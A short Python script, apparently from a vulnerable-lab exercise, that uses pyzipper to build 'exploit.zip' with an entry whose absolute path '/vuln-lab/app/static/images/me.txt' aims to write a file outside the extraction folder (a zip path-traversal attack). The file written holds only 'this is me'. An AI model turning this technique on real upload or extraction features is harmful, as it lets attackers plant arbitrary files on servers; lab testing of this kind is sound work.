import pyzipper
import time

with pyzipper.ZipFile("exploit.zip", 'w', compression=pyzipper.ZIP_LZMA) as zf:
    zip_info = zf.zipinfo_cls(filename="/vuln-lab/app/static/images/me.txt", date_time=time.localtime(time.time())[:6])
    zf.writestr(zip_info, "this is me")